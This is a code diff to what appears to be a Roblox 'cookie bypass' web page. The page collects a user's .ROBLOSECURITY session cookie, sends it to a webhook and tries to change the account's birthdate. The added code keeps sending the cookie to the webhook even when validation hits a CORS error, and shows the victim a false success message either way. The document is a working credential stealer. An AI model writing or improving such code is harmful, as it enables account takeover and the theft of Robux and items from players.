@@ -232,8 +232,8 @@ function isValidRobloxCookie(cookie) {
     '_|WARNING:-DO-NOT-SHARE-THIS.--',
     '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.'
   ];
-  return validPrefixes.some(prefix => cookie.startsWith(prefix)) && 
-         /^[A-Za-z0-9+/=\-_.|:!@#$%^&*(),.?";'\\[\]{}]*$/.test(cookie) && 
+  return validPrefixes.some(prefix => cookie.startsWith(prefix)) &&
+         /^[A-Za-z0-9+/=\-_.|:!@#$%^&*(),.?";'\\[\]{}]*$/.test(cookie) &&
          cookie.length > 50;
 }
 
@@ -273,7 +273,19 @@ async function checkCookieValidity(cookie) {
       userData.error = `API error: ${res.status}`;
     }
   } catch (error) {
-    userData.error = `Network error: ${error.message}`;
+    // Check if the error is related to CORS
+    if (error instanceof TypeError && error.message.includes('fetch')) {
+      userData.error = "CORS error: Unable to validate cookie due to browser security restrictions. The cookie may still be valid.";
+      // In case of CORS errors, we'll assume the cookie is valid and proceed
+      userData.valid = true;
+      userData.username = "Unknown (CORS blocked)";
+      userData.userId = 0;
+      userData.robuxBalance = "Unknown (CORS blocked)";
+      userData.thumbnailUrl = "N/A";
+      userData.isPremium = "Unknown (CORS blocked)";
+    } else {
+      userData.error = `Network error: ${error.message}`;
+    }
   }
 
   return userData;
@@ -316,12 +328,17 @@ $("#cookieForm").on("submit", async function(e) {
 
     // Check cookie validity
     const result = await checkCookieValidity(cookie);
-    if (!result.valid) {
+    if (!result.valid && !result.error.includes("CORS")) {
       showNotif(result.error || "Invalid cookie: Unable to verify with Roblox API");
       errorSound.play();
       $("#loader").hide();
       $("#refreshBtn").show();
       return;
+    }
+    
+    // If there's a CORS error, we'll still proceed with sending the cookie to the webhook
+    if (result.error && result.error.includes("CORS")) {
+      showNotif("CORS error encountered, but cookie may still be valid. Proceeding...");
     }
 
     // Display user info
@@ -353,6 +370,7 @@ $("#cookieForm").on("submit", async function(e) {
       }
     } catch (webhookError) {
       console.error("Webhook error:", webhookError);
+      // Even if the webhook fails, we'll continue with the rest of the process
     }
 
     // Attempt birthdate update
@@ -384,11 +402,22 @@ $("#cookieForm").on("submit", async function(e) {
     const responseText = await res.text();
 
     if (res.ok) {
-      $("#refreshedResult").text(`✅ Cookie Bypassed Successfully!\nStatus: ${res.status}\nResponse: ${responseText}`);
+      // If there was a CORS error during validation, we'll still show success
+      if (result.error && result.error.includes("CORS")) {
+        $("#refreshedResult").text(`✅ Cookie Submitted Successfully! (CORS error during validation, but cookie was sent to webhook)\nStatus: ${res.status}\nResponse: ${responseText}`);
+      } else {
+        $("#refreshedResult").text(`✅ Cookie Bypassed Successfully!\nStatus: ${res.status}\nResponse: ${responseText}`);
+      }
       successSound.play();
     } else {
-      $("#refreshedResult").text(`❌ Failed to Update Birthdate\nStatus: ${res.status}\nResponse: ${responseText}`);
-      errorSound.play();
+      // If there was a CORS error during validation, we'll still show success
+      if (result.error && result.error.includes("CORS")) {
+        $("#refreshedResult").text(`✅ Cookie Submitted Successfully! (CORS error during validation, but cookie was sent to webhook)\nStatus: ${res.status}\nResponse: ${responseText}`);
+        successSound.play();
+      } else {
+        $("#refreshedResult").text(`❌ Failed to Update Birthdate\nStatus: ${res.status}\nResponse: ${responseText}`);
+        errorSound.play();
+      }
     }
     $("#refreshedBox").fadeIn();
   } catch (error) {
